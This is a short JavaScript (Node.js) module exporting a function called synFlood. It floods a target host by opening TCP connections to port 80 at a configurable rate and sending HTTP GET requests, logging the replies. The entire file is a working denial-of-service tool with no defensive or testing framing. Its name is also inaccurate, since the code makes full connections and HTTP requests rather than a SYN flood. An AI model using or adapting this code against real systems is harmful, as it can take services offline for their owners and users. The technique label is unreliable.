const net = require('net');

function synFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const client = new net.Socket();
        client.connect(80, target, () => {
            client.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
        });

        client.on('data', (data) => {
            logOutput('Received: ' + data);
            client.destroy();
        });

        client.on('close', () => {
            logOutput('Connection closed');
        });

        client.on('error', (err) => {
            logOutput('Error: ' + err.message);
        });
    }, 1000 / rateLimit);
}

module.exports = synFlood;
